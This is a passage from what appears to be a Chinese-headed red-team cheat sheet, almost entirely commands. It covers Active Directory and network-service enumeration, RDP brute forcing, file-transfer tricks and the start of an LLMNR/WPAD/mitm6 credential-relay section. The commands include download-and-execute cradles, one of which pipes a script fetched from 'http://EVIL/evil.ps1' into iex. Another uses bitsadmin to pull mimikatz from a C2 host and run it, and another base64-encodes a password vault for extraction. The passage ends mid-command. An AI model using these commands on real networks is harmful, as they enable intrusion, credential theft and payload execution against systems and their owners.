<h3 id="1-1-3-红队CSharp脚本"><a href="#1-1-3-红队CSharp脚本" class="headerlink" title="1.1.3 红队CSharp脚本"></a>1.1.3 红队CSharp脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/Mr-Un1k0d3r/RedTeamCSharpScripts</span><br><span class="line"></span><br><span class="line">LDAPUtility.cs</span><br><span class="line"></span><br><span class="line">Usage: ldaputility.exe options domain [arguments]</span><br><span class="line"></span><br><span class="line">ldaputility.exe DumpAllUsers m0chan</span><br><span class="line">ldaputility.exe DumpUser m0chan mr.un1k0d3r</span><br><span class="line">ldaputility.exe DumpUsersEmail m0chan</span><br><span class="line">ldaputility.exe DumpAllComputers m0chan </span><br><span class="line">ldaputility.exe DumpComputer m0chan DC01</span><br><span class="line">ldaputility.exe DumpAllGroups m0chan</span><br><span class="line">ldaputility.exe DumpGroup m0chan &quot;Domain Admins&quot;</span><br><span class="line">ldaputility.exe DumpPasswordPolicy m0chan</span><br><span class="line"></span><br><span class="line">Also WMIUtility.cs for WMI Calls &amp; LDAPQuery.cs for Raw LDAP Queries.</span><br><span class="line"></span><br><span class="line">See github linked above for full details.</span><br></pre></td></tr></table></figure>

<h3 id="1-1-4-活动目录"><a href="#1-1-4-活动目录" class="headerlink" title="1.1.4 活动目录"></a>1.1.4 活动目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">nltest /DCLIST:DomainName</span><br><span class="line">nltest /DCNAME:DomainName</span><br><span class="line">nltest /DSGETDC:DomainName</span><br><span class="line"></span><br><span class="line"># Get Current Domain Info - Similar to Get-Domain</span><br><span class="line">[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</span><br><span class="line"></span><br><span class="line"># Get Domain Trust Info - Similar to Get-DomainTrust</span><br><span class="line">([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()</span><br><span class="line"></span><br><span class="line"># View Domain Info</span><br><span class="line">[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()</span><br><span class="line"></span><br><span class="line">#  View Domain Trust Information</span><br><span class="line">([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(&apos;Forest&apos;, &apos;forest-of-interest.local&apos;)))).GetAllTrustRelationships()</span><br><span class="line"></span><br><span class="line">nltest [server:&lt;fqdn_foreign_domain&gt;] /domain_trusts /all_trusts /v</span><br><span class="line"></span><br><span class="line">nltest /dsgetfti:&lt;domain&gt;</span><br><span class="line"></span><br><span class="line">nltest /server:&lt;ip_dc&gt; /domain_trusts /all_trusts</span><br><span class="line"></span><br><span class="line">([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()</span><br><span class="line"></span><br><span class="line"># View All Domain Controllers</span><br><span class="line">nltest /dclist:offense.local</span><br><span class="line">net group &quot;domain controllers&quot; /domain</span><br><span class="line"></span><br><span class="line"># View DC for Current Session</span><br><span class="line">nltest /dsgetdc:m0chanAD.local</span><br><span class="line"></span><br><span class="line"># View Domain Trusts from CMD</span><br><span class="line">nltest /domain_trusts</span><br><span class="line"></span><br><span class="line"># View User Info from CMD</span><br><span class="line">nltest /user:&quot;m0chan&quot;</span><br><span class="line"></span><br><span class="line"># get domain name and DC the user authenticated to</span><br><span class="line">klist</span><br><span class="line"></span><br><span class="line"># Get All Logged on Sessions, Includes NTLM &amp; Kerberos</span><br><span class="line">klist sessions</span><br><span class="line"></span><br><span class="line"># View Kerb Tickets</span><br><span class="line">klist</span><br><span class="line"></span><br><span class="line"># View Cached Krbtgt</span><br><span class="line">klist tgt</span><br><span class="line"></span><br><span class="line"># whoami on older Windows systems</span><br><span class="line">set u</span><br><span class="line"></span><br><span class="line">#List all Usernames</span><br><span class="line">([adsisearcher]&quot;(&amp;(objectClass=User)(samaccountname=*))&quot;).FindAll().Properties.samaccountname</span><br><span class="line"></span><br><span class="line">#List Administrators</span><br><span class="line"></span><br><span class="line">([adsisearcher]&quot;(&amp;(objectClass=User)(admincount=1))&quot;).FindAll().Properties.samaccountname</span><br><span class="line"></span><br><span class="line">#List all Info about Specific User</span><br><span class="line"></span><br><span class="line">([adsisearcher]&quot;(&amp;(objectClass=User)(samaccountname=&lt;username&gt;))&quot;).FindAll().Properties</span><br><span class="line"></span><br><span class="line">#View All Users with Description Field Set</span><br><span class="line"></span><br><span class="line">([adsisearcher]&quot;(&amp;(objectClass=group)(samaccountname=*))&quot;).FindAll().Properties | % &#123; Write-Host $_.samaccountname : $_.description &#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-1-5-从Linux-Box进行AD枚举-AD工具"><a href="#1-1-5-从Linux-Box进行AD枚举-AD工具" class="headerlink" title="1.1.5 从Linux Box进行AD枚举-AD工具"></a>1.1.5 从Linux Box进行AD枚举-AD工具</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/jasonwbarnett/linux-adtool</span><br><span class="line"></span><br><span class="line">tar zxvf adtools-1.x.tar.gz</span><br><span class="line">cd adtools-1.x</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">&gt; adtool list ou=user,dc=example,dc=com</span><br><span class="line">CN=allusers,OU=user,DC=example,DC=com</span><br><span class="line">OU=finance,OU=user,DC=example,DC=com</span><br><span class="line">OU=administration,OU=user,DC=example,DC=com</span><br><span class="line"></span><br><span class="line">&gt; adtool oucreate marketing ou=user,dc=example,dc=com</span><br><span class="line">&gt; adtool useradd jsmith ou=marketing,ou=user,dc=example,dc=com</span><br><span class="line">&gt; adtool setpass jsmith banana</span><br><span class="line">&gt; adtool unlock jsmith</span><br><span class="line">&gt; adtool groupadd allusers jsmith</span><br><span class="line">&gt; adtool attributereplace jsmith telephonenumber 123</span><br><span class="line">&gt; adtool attributereplace jsmith mail jsmith@example.com</span><br></pre></td></tr></table></figure>

<h3 id="1-1-6-SharpView枚举"><a href="#1-1-6-SharpView枚举" class="headerlink" title="1.1.6 SharpView枚举"></a>1.1.6 SharpView枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/tevora-threat/SharpView</span><br><span class="line"></span><br><span class="line">Get-DomainFileServer</span><br><span class="line">Get-DomainGPOUserLocalGroupMapping</span><br><span class="line">Find-GPOLocation</span><br><span class="line">Get-DomainGPOComputerLocalGroupMapping</span><br><span class="line">Find-GPOComputerAdmin</span><br><span class="line">Get-DomainObjectAcl</span><br><span class="line">Get-ObjectAcl</span><br><span class="line">Add-DomainObjectAcl</span><br><span class="line">Add-ObjectAcl</span><br><span class="line">Remove-DomainObjectAcl</span><br><span class="line">Get-RegLoggedOn</span><br><span class="line">Get-LoggedOnLocal</span><br><span class="line">Get-NetRDPSession</span><br><span class="line">Test-AdminAccess</span><br><span class="line">Invoke-CheckLocalAdminAccess</span><br><span class="line">Get-WMIProcess</span><br><span class="line">Get-NetProcess</span><br><span class="line">Get-WMIRegProxy</span><br><span class="line">Get-Proxy</span><br><span class="line">Get-WMIRegLastLoggedOn</span><br><span class="line">Get-LastLoggedOn</span><br><span class="line">Get-WMIRegCachedRDPConnection</span><br><span class="line">Get-CachedRDPConnection</span><br><span class="line">Get-WMIRegMountedDrive</span><br><span class="line">Get-RegistryMountedDrive</span><br><span class="line">Find-InterestingDomainAcl</span><br><span class="line">Invoke-ACLScanner</span><br><span class="line">Get-NetShare</span><br><span class="line">Get-NetLoggedon</span><br></pre></td></tr></table></figure>

<h3 id="1-1-7-SMB枚举"><a href="#1-1-7-SMB枚举" class="headerlink" title="1.1.7 SMB枚举"></a>1.1.7 SMB枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 139,445 --script smb.nse,smb-enum-shares,smbls</span><br><span class="line">enum4linux 1.3.3.7</span><br><span class="line">smbmap -H 1.3.3.7</span><br><span class="line">smbclient -L \\INSERTIPADDRESS</span><br><span class="line">smbclient -L INSERTIPADDRESS</span><br><span class="line">smbclient //INSERTIPADDRESS/tmp</span><br><span class="line">smbclient \\\\INSERTIPADDRESS\\ipc$ -U john</span><br><span class="line">smbclient //INSERTIPADDRESS/ipc$ -U john</span><br><span class="line">smbclient //INSERTIPADDRESS/admin$ -U john</span><br><span class="line">nbtscan [SUBNET]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Check for SMB Signing</span><br><span class="line">nmap --script smb-security-mode.nse -p 445 10.10.14.14</span><br></pre></td></tr></table></figure>

<h3 id="1-1-8-SNMP枚举"><a href="#1-1-8-SNMP枚举" class="headerlink" title="1.1.8 SNMP枚举"></a>1.1.8 SNMP枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -c public -v1 10.10.14.14</span><br><span class="line">snmpcheck -t 10.10.14.14 -c public</span><br><span class="line">onesixtyone -c names -i hosts</span><br><span class="line">nmap -sT -p 161 10.10.14.14 -oG snmp_results.txt</span><br><span class="line">snmpenum -t 10.10.14.14</span><br></pre></td></tr></table></figure>

<h3 id="1-1-9-MySQL枚举"><a href="#1-1-9-MySQL枚举" class="headerlink" title="1.1.9 MySQL枚举"></a>1.1.9 MySQL枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -Pn -vv  10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122</span><br></pre></td></tr></table></figure>

<h3 id="1-1-10-DNS区域转移"><a href="#1-1-10-DNS区域转移" class="headerlink" title="1.1.10 DNS区域转移"></a>1.1.10 DNS区域转移</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dig axfr blah.com @ns1.m0chan.com</span><br><span class="line">nslookup -&gt; set type=any -&gt; ls -d m0chan.com</span><br><span class="line">dnsrecon -d m0chan -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml</span><br></pre></td></tr></table></figure>

<h3 id="1-1-11-LDAP"><a href="#1-1-11-LDAP" class="headerlink" title="1.1.11 LDAP"></a>1.1.11 LDAP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -H ldap://&lt;ip&gt;</span><br><span class="line">ldapwhoami</span><br></pre></td></tr></table></figure>

<h3 id="1-1-12-RPC枚举"><a href="#1-1-12-RPC枚举" class="headerlink" title="1.1.12 RPC枚举"></a>1.1.12 RPC枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rpcclient -U &quot;10.10.14.14&quot;</span><br><span class="line">srvinfo</span><br><span class="line">enumdomusers</span><br><span class="line">enumalsgroups domain</span><br><span class="line">lookupnames administrators</span><br><span class="line">querydominfo</span><br><span class="line">enumdomusers</span><br><span class="line">queryuser &lt;user&gt;</span><br><span class="line">lsaquery</span><br><span class="line">lookupnames Guest</span><br><span class="line">lookupnames Administrator</span><br></pre></td></tr></table></figure>

<h3 id="1-1-13-远程桌面"><a href="#1-1-13-远程桌面" class="headerlink" title="1.1.13 远程桌面"></a>1.1.13 远程桌面</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rdesktop -u guest -p guest INSERTIPADDRESS -g 94%</span><br><span class="line"></span><br><span class="line"># Brute force</span><br><span class="line">ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://INSERTIPADDRESS</span><br></pre></td></tr></table></figure>

<h1 id="0x02-文件传输"><a href="#0x02-文件传输" class="headerlink" title="0x02 文件传输"></a>0x02 文件传输</h1><h2 id="2-1-TFTP"><a href="#2-1-TFTP" class="headerlink" title="2.1 TFTP"></a>2.1 TFTP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">m0chan Machine</span><br><span class="line">mkdir tftp</span><br><span class="line">atftpd --deamon --port 69 tftp</span><br><span class="line">cp *file* tftp</span><br><span class="line">On victim machine:</span><br><span class="line">tftp -i &lt;[IP]&gt; GET &lt;[FILE]&gt;</span><br></pre></td></tr></table></figure>

<h2 id="2-2-FTP"><a href="#2-2-FTP" class="headerlink" title="2.2 FTP"></a>2.2 FTP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo open &lt;[IP]&gt; 21 &gt; ftp.txt</span><br><span class="line">echo USER demo &gt;&gt; ftp.txt</span><br><span class="line">echo ftp &gt;&gt; ftp.txt</span><br><span class="line">echo bin &gt;&gt; ftp.txt</span><br><span class="line">echo GET nc.exe &gt;&gt; ftp.txt</span><br><span class="line">echo bye &gt;&gt; ftp.txt</span><br><span class="line">ftp -v -n -s:ftp.txt</span><br></pre></td></tr></table></figure>

<h2 id="2-3-VBS-Script"><a href="#2-3-VBS-Script" class="headerlink" title="2.3 VBS Script"></a>2.3 VBS Script</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs</span><br><span class="line">echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs</span><br><span class="line">echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs</span><br><span class="line">echo Err.Clear &gt;&gt; wget.vbs</span><br><span class="line">echo Set http = Nothing &gt;&gt; wget.vbs</span><br><span class="line">echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http = CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbs</span><br><span class="line">echo http.Send &gt;&gt; wget.vbs</span><br><span class="line">echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs</span><br><span class="line">echo Set http = Nothing &gt;&gt; wget.vbs</span><br><span class="line">echo Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo Set ts = fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs</span><br><span class="line">echo strData = &quot;&quot; &gt;&gt; wget.vbs</span><br><span class="line">echo strBuffer = &quot;&quot; &gt;&gt; wget.vbs</span><br><span class="line">echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs</span><br><span class="line">echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs</span><br><span class="line">echo Next &gt;&gt; wget.vbs</span><br><span class="line">echo ts.Close &gt;&gt; wget.vbs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cscript wget.vbs &lt;url&gt; &lt;out_file&gt;</span><br><span class="line"></span><br><span class="line">Use echoup function on pentest.ws to generate echo commands.</span><br><span class="line">https://pentest.ws/features</span><br></pre></td></tr></table></figure>

<h2 id="2-4-Powershell"><a href="#2-4-Powershell" class="headerlink" title="2.4 Powershell"></a>2.4 Powershell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/danielbohannon/Invoke-CradleCrafter Use this to craft obsufacted cradles</span><br><span class="line"></span><br><span class="line">Invoke-WebRequest &quot;https://server/filename&quot; -OutFile &quot;C:\Windows\Temp\filename&quot;</span><br><span class="line"></span><br><span class="line">(New-Object System.Net.WebClient).DownloadFile(&quot;https://server/filename&quot;, &quot;C:\Windows\Temp\filename&quot;) </span><br><span class="line"></span><br><span class="line">#Powershell Download to Memory</span><br><span class="line"></span><br><span class="line">IEX(New-Object Net.WebClient).downloadString(&apos;http://server/script.ps1&apos;)</span><br><span class="line"></span><br><span class="line">#Powershell with Proxy</span><br><span class="line"></span><br><span class="line">$browser = New-Object System.Net.WebClient;</span><br><span class="line">$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;</span><br><span class="line">IEX($browser.DownloadString(&apos;https://server/script.ps1&apos;));</span><br></pre></td></tr></table></figure>

<h2 id="2-5-Powershell-Base64"><a href="#2-5-Powershell-Base64" class="headerlink" title="2.5 Powershell Base64"></a>2.5 Powershell Base64</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$fileName = &quot;Passwords.kdbx&quot;</span><br><span class="line">$fileContent = get-content $fileName</span><br><span class="line">$fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)</span><br><span class="line">$fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)</span><br><span class="line">$fileContentEncoded | set-content ($fileName + &quot;.b64&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="2-6-安全复制-pscp-exe"><a href="#2-6-安全复制-pscp-exe" class="headerlink" title="2.6 安全复制/ pscp.exe"></a>2.6 安全复制/ pscp.exe</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pscp.exe C:\Users\Public\m0chan.txt user@target:/tmp/m0chan.txt</span><br><span class="line">pscp.exe user@target:/home/user/m0chan.txt C:\Users\Public\m0chan.txt</span><br></pre></td></tr></table></figure>

<h2 id="2-7-BitsAdmin-exe"><a href="#2-7-BitsAdmin-exe" class="headerlink" title="2.7 BitsAdmin.exe"></a>2.7 BitsAdmin.exe</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c &quot;bitsadmin.exe /transfer downld_job /download /priority high http://c2.m0chan.com C:\Temp\mimikatz.exe &amp; start C:\Temp\binary.exe&quot;</span><br></pre></td></tr></table></figure>

<h2 id="2-8-Remote-Desktop"><a href="#2-8-Remote-Desktop" class="headerlink" title="2.8 Remote Desktop"></a>2.8 Remote Desktop</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 10.10.10.10 -r disk:linux=&apos;/home/user/filetransferout&apos;</span><br></pre></td></tr></table></figure>

<h2 id="2-9-WinHTTP-Com-Object"><a href="#2-9-WinHTTP-Com-Object" class="headerlink" title="2.9 WinHTTP Com Object"></a>2.9 WinHTTP Com Object</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[System.Net.WebRequest]::DefaultWebProxy</span><br><span class="line">[System.Net.CredentialCache]::DefaultNetworkCredentials</span><br><span class="line">$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open(&apos;GET&apos;,&apos;http://EVIL/evil.ps1&apos;,$false);$h.send();iex $h.responseText</span><br></pre></td></tr></table></figure>

<h2 id="2-10-CertUtil"><a href="#2-10-CertUtil" class="headerlink" title="2.10 CertUtil"></a>2.10 CertUtil</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#File Transfer</span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -split -f https://m0chan:8888/filename outputfilename</span><br><span class="line"></span><br><span class="line">#CertUtil Base64 Transfers</span><br><span class="line"></span><br><span class="line">certutil.exe -encode inputFileName encodedOutputFileName</span><br><span class="line">certutil.exe -decode encodedInputFileName decodedOutputFileName</span><br></pre></td></tr></table></figure>

<h2 id="2-11-Curl-Windows-1803"><a href="#2-11-Curl-Windows-1803" class="headerlink" title="2.11 Curl (Windows 1803+)"></a>2.11 Curl (Windows 1803+)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl http://server/file -o file</span><br><span class="line">curl http://server/file.bat | cmd</span><br><span class="line"></span><br><span class="line">IEX(curl http://server/script.ps1);Invoke-Blah</span><br></pre></td></tr></table></figure>

<h2 id="2-12-SMB"><a href="#2-12-SMB" class="headerlink" title="2.12 SMB"></a>2.12 SMB</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbserver.py Share `pwd` -u m0chan -p m0chan --smb-2support</span><br></pre></td></tr></table></figure>

<h1 id="0x03-exploit"><a href="#0x03-exploit" class="headerlink" title="0x03 exploit"></a>0x03 exploit</h1><h2 id="3-1-LLMNR-NBT-NS欺骗"><a href="#3-1-LLMNR-NBT-NS欺骗" class="headerlink" title="3.1 LLMNR / NBT-NS欺骗"></a>3.1 LLMNR / NBT-NS欺骗</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#Responder to Steal Creds</span><br><span class="line"></span><br><span class="line">git clone https://github.com/SpiderLabs/Responder.git python Responder.py -i local-ip -I eth0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LLMNR and NBT-NS is usually on by default and there purpose is to act as a fallback to DNS. i/e if you search \\HRServer\ but it dosent exist, Windows (by default) will send out a LLMNR broadcast across the network. By using Responder we can respond to these broadcasts and say something like</span><br><span class="line"></span><br><span class="line">&apos;Yeah I&apos;m HRServer, authenticate to me and I will get a NTLMv2 hash which I can crack or relay. More on relaying below&apos;</span><br></pre></td></tr></table></figure>

<h2 id="3-2-Responder-WPAD-Attack"><a href="#3-2-Responder-WPAD-Attack" class="headerlink" title="3.2 Responder WPAD Attack"></a>3.2 Responder WPAD Attack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 wpad</span><br><span class="line"></span><br><span class="line">By default, Windows is configured to search for a Web Proxy Auto-Discovery file when using the internet</span><br><span class="line"></span><br><span class="line">Go to internet explorer and search for Google which automatically searches for a WPAD file... </span><br><span class="line"></span><br><span class="line">Then take NTLMv2 hash and NTLM Relay it or send to cracking rig.</span><br></pre></td></tr></table></figure>

<h2 id="3-3-mitm6"><a href="#3-3-mitm6" class="headerlink" title="3.3 mitm6"></a>3.3 mitm6</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#Use when WPAD attack is not working, this uses IPv6 and DNS to relay creds to a target. </span><br><span class="line"></span><br><span class="line">By default IPV6 should be enabled. </span><br><span class="line">git clone https://github.com/fox-it/mitm6.git </span><br><span class="line">cd /opt/tools/mitm6</span><br><span class="line">pip install .</span><br><span class="line"></span><br><span class="line">mitm6 -d m0chanAD.local</span><br><span class="line"></span><br><span class="line">Now the vuln occurs, Windows prefers IPV6 over IPv4 meaning DNS = controlled by attacker. </span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -wh webserverhostingwpad:80 -t smb://TARGETIP/ 